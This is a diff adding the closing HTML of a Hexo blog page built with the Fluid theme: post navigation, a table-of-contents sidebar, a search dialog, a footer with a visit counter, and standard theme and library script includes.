+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/04/%E5%85%A5%E9%99%A2%E5%B0%8F%E8%AE%B0/" title="入院小记">
+                        <span class="hidden-mobile">入院小记</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
